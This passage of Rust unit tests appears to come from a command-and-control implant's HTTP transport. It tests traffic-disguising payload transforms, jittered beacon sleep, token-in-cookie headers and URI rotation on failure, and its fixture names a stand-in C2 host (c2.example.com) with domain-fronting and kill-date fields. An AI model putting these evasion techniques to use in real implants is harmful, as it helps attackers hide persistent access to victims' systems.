                    append: String::new(),
                    transform: TransformType::None,
                    mask_stride: 0,
                },
            }),
            dns: crate::malleable::DnsConfig::default(),
        }
    }

    #[test]
    fn test_uri_round_robin() {
        let profile = test_profile();
        let txn = profile.http_get.as_ref().unwrap();
        let idx = AtomicUsize::new(0);

        let u0 = HttpTransport::next_uri(txn, &idx);
        let u1 = HttpTransport::next_uri(txn, &idx);
        let u2 = HttpTransport::next_uri(txn, &idx);
        // Should cycle through URIs deterministically.
        assert!(u0 == "/api/v1/data" || u0 == "/static/asset.js");
        assert!(u1 == "/api/v1/data" || u1 == "/static/asset.js");
        assert!(u2 == "/api/v1/data" || u2 == "/static/asset.js");
    }

    #[test]
    fn test_client_transform_roundtrip() {
        let profile = test_profile();
        let txn = profile.http_get.as_ref().unwrap();

        let payload = b"hello world from agent";
        let encoded = HttpTransport::apply_client_transform(txn, payload);

        // Should start with prepend and end with append.
        assert!(encoded.starts_with(b"PRE_"));
        assert!(encoded.ends_with(b"_POST"));

        // Reverse through the server transform (different config, but same base64).
        let decoded = HttpTransport::reverse_server_transform(txn, &encoded).unwrap();
        assert_eq!(decoded, payload);
    }

    #[test]
    fn test_server_transform_roundtrip() {
        let profile = test_profile();
        let txn = profile.http_get.as_ref().unwrap();

        let payload = b"tasking data from server";
        // Manually apply the server transform for testing:
        // transform → prepend → append
        let transformed = txn.server.transform.encode(payload);
        let mut encoded = Vec::new();
        encoded.extend_from_slice(b"SRV_PRE_");
        encoded.extend_from_slice(&transformed);
        encoded.extend_from_slice(b"_SRV_POST");

        let decoded = HttpTransport::reverse_server_transform(txn, &encoded).unwrap();
        assert_eq!(decoded, payload);
    }

    #[test]
    fn test_unescape_crlf() {
        assert_eq!(
            HttpTransport::unescape_crlf("hello\\r\\nworld"),
            b"hello\r\nworld".to_vec()
        );
        assert_eq!(
            HttpTransport::unescape_crlf("plain text"),
            b"plain text".to_vec()
        );
        assert_eq!(HttpTransport::unescape_crlf("\\nonly"), b"\nonly".to_vec());
    }

    #[test]
    fn test_jittered_sleep() {
        let profile = test_profile();
        // With jitter=10 and sleep_time=30, the sleep should be between
        // 27 and 33 seconds (inclusive, approximately).
        for _ in 0..100 {
            let dur = profile.jittered_sleep();
            let secs = dur.as_secs();
            assert!(
                secs >= 27 && secs <= 33,
                "jittered sleep {}s out of range [27, 33]",
                secs
            );
        }
    }

    #[test]
    fn test_profile_headers_substitution() {
        let profile = test_profile();
        let txn = profile.http_get.as_ref().unwrap();
        let headers = txn.build_headers("my-secret-token");
        assert_eq!(headers.get("Cookie").unwrap(), "sid=my-secret-token");
        assert_eq!(headers.get("Accept").unwrap(), "application/json");
    }

    #[test]
    fn test_mask_stride_transform() {
        let profile = AgentMalleableProfile {
            profile: ProfileInfo::default(),
            global: GlobalConfig::default(),
            ssl: SslConfig::default(),
            http_get: Some(HttpTransactionConfig {
                uri: vec!["/test".to_string()],
                verb: "POST".to_string(),
                headers: HashMap::new(),
                client: HttpTransformConfig {
                    prepend: String::new(),
                    append: String::new(),
                    transform: TransformType::Mask,
                    mask_stride: 0x37,
                },
                server: HttpTransformConfig {
                    prepend: String::new(),
                    append: String::new(),
                    transform: TransformType::Mask,
                    mask_stride: 0x37,
                },
            }),
            http_post: None,
            dns: crate::malleable::DnsConfig::default(),
        };

        let txn = profile.http_get.as_ref().unwrap();
        let payload = b"mask test data";

        let encoded = HttpTransport::apply_client_transform(txn, payload);
        assert_ne!(encoded, payload);

        let decoded = HttpTransport::reverse_server_transform(txn, &encoded).unwrap();
        assert_eq!(decoded, payload);
    }

    #[test]
    fn test_failure_rotation() {
        let profile = test_profile();
        // Simulate consecutive failures exceeding threshold.
        let transport = HttpTransport {
            profile: Arc::new(profile),
            client: reqwest::Client::new(),
            session: CryptoSession::from_shared_secret(b"test-key-for-unit-test-only"),
            agent_id: "test-agent".to_string(),
            get_uri_idx: AtomicUsize::new(0),
            post_uri_idx: AtomicUsize::new(0),
            consecutive_failures: AtomicUsize::new(0),
            kill_date: String::new(),
            cdn_relay: false,
            cdn_endpoint: String::new(),
            direct_c2_endpoint: "https://c2.example.com".to_string(),
            host_header: String::new(),
            front_domain: None,
            failover: std::sync::Mutex::new(FailoverState::new(
                vec![],
                "https://c2.example.com".to_string(),
            )),
        };

        assert_eq!(transport.get_uri_idx.load(Ordering::Relaxed), 0);
        transport.rotate_uri_on_failure("http_get");
        assert_eq!(transport.get_uri_idx.load(Ordering::Relaxed), 1);
        transport.rotate_uri_on_failure("http_get");
        assert_eq!(transport.get_uri_idx.load(Ordering::Relaxed), 2);
    }
}
